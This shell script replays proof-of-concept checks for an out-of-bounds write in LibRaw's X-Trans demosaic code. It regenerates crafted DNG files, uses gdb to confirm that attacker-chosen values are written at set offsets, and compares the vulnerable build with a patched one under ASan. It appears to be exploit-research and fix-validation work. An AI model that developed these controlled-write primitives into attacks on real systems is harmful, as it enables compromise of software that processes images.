#!/bin/sh
# One-command offline replay of the libraw2shell W13/W14/W15 chosen-value
# claims. Run from a clean archive:
#
#   git archive HEAD lab/frontier/libraw2shell | tar x -C /tmp/lr-replay
#   cd /tmp/lr-replay/lab/frontier/libraw2shell && sh replay-all.sh
#
# Every input is regenerated from the tracked pinned artifacts and committed
# specs; no author-local /tmp tree, network access or debugger-forced write is
# involved. The dcraw_emu consumer is the unmodified pinned build in all runs.
set -u
cd "$(dirname "$0")" || exit 2
ROOT=$(pwd)
WORK=${1:-/tmp/libraw2shell-replay}
mkdir -p "$WORK"
export ASAN_OPTIONS=detect_leaks=0

pass=0
fail=0
ok()   { printf 'PASS %-40s\n' "$1"; pass=$((pass+1)); }
bad()  { printf 'FAIL %-40s %s\n' "$1" "${2-}"; fail=$((fail+1)); }
hashof() { sha256sum "$1" | cut -d' ' -f1; }
want_hash() { # label file expected
    h=$(hashof "$2")
    if [ "$h" = "$3" ]; then ok "$1"; else bad "$1" "got $h want $3"; fi
}
want_line() { # label file fixed-string
    if grep -qF "$3" "$2"; then ok "$1"; else bad "$1" "missing: $3"; fi
}
want_rc() { # label expected cmd...
    label=$1; expected=$2; shift 2
    "$@" >"$WORK/$label.out" 2>&1
    rc=$?
    if [ "$rc" = "$expected" ]; then ok "$label rc=$rc"; else bad "$label rc=$rc want $expected"; fi
}
echo "== pinned and generator bytes =="
want_hash tarball   pinned/LibRaw-0.22.3.tar.gz 7edf96c5b70cff88980a02ab0fc8af125cb6a4a377985573c654439d9d02355c
want_hash fixpatch  pinned/fix-894.patch         32fc61e5a52c0b393fd09175bf9b1283c29065767613d15a16e421dd1a2afc9c
want_hash generator craft_uncompressed_poc.py   0d91b5a8324a814fb7097051a456949dac610ff9d21d8c22d717beedddf1749c
want_hash base      w11/targetbeef.input         cf5030ebfa46f3badc4498e4ec4230c670ba010b70f5ace3a872d8fcbc33d33b
want_hash w13spec   w13/dead-target.json         b3e416486b13e0fb2994b1c194c9ed50dbea573febe15894ef9f0ff830eea43e
want_hash w14spec   w14/two-offset.json          9f09737465417c9dcbfb030c1a5339ad6c588942d9f33d308f8c19220b1a5929
want_hash w15spec   w15/band150.json             08de8dd7d3bf8b9bdb9bac9c72868f3afebf174b55fc43c98f4aedc8ffb1308f

echo "== build the four pinned trees =="
sh bootstrap.sh || { bad bootstrap; echo "REPLAY_W13_W14_W15_FAIL"; exit 1; }
ok bootstrap

V=pinned/LibRaw-0.22.3/bin/dcraw_emu
F=fixed/LibRaw-0.22.3/bin/dcraw_emu
O=o0/LibRaw-0.22.3/bin/dcraw_emu

echo "== regenerate the three DNGs =="
python3 craft_uncompressed_poc.py w11/targetbeef.input "$WORK/dead-target.input" w13/dead-target.json
python3 craft_uncompressed_poc.py w11/targetbeef.input "$WORK/two-offset.input"  w14/two-offset.json
python3 craft_uncompressed_poc.py w11/targetbeef.input "$WORK/band150.input"     w15/band150.json
want_hash w13-input "$WORK/dead-target.input" 18b012c98809a9f4822a173ee591b046db3b6eb612326e30e259984467149e78
want_hash w14-input "$WORK/two-offset.input"  4fb6e951e06db573f818b2377f71320578afaf61edf12c30ee5748b90618a8c2
want_hash w15-input "$WORK/band150.input"     86b5e7c7912437f16bc73b273d41e6ae15cfb6fcd976d7431bb02cb7f7441b1e

echo "== unmodified -O0 gdb value probes =="
gdb -q -batch -ex 'set pagination off' -ex "set \$inp=\"$WORK/dead-target.input\"" \
    -x w11/probe.gdb "$O" >"$WORK/w13-gdb.txt" 2>&1
want_line w13-triple "$WORK/w13-gdb.txt" 'W11 VAL first OOB: 9000 beef dead 0'

gdb -q -batch -ex 'set pagination off' -ex "set \$inp=\"$WORK/two-offset.input\"" \
    -x w14/oobmulti.gdb "$O" >"$WORK/w14-gdb.txt" 2>&1
want_line w14-second-offset "$WORK/w14-gdb.txt" 'MULTI off=16800: 140e 1357 9f09 0'

gdb -q -batch -ex 'set pagination off' -ex "set \$inp=\"$WORK/band150.input\"" \
    -x w15/exact.gdb "$O" >"$WORK/w15-gdb.txt" 2>&1
want_line w15-preserved-band "$WORK/w15-gdb.txt" 'EXACT off=16800: 140e 1357 9f09 0'
want_line w15-third-band-a   "$WORK/w15-gdb.txt" 'EXACT off=33000: 3876 2468 9f09 0'
want_line w15-third-band-b   "$WORK/w15-gdb.txt" 'EXACT off=36000: 140e 2468 9f09 0'

echo "== ASan vulnerable / fixed / no-option controls =="
for name in dead-target two-offset band150; do
    input="$WORK/$name.input"
    want_rc "$name-asan-attack" 1 "$V" -n 1 "$input"
    want_line "$name-WRITE-2" "$WORK/$name-asan-attack.out" 'WRITE of size 2'
    want_line "$name-at-427" "$WORK/$name-asan-attack.out" 'xtrans_demosaic.cpp:427'
    want_rc "$name-asan-fixed" 0 "$F" -n 1 "$input"
    want_rc "$name-no-option"  0 "$V" "$input"
done

printf 'PASS=%s FAIL=%s\n' "$pass" "$fail"
if [ "$fail" = 0 ]; then
    echo REPLAY_W13_W14_W15_OK
    exit 0
fi
echo REPLAY_W13_W14_W15_FAIL
exit 1
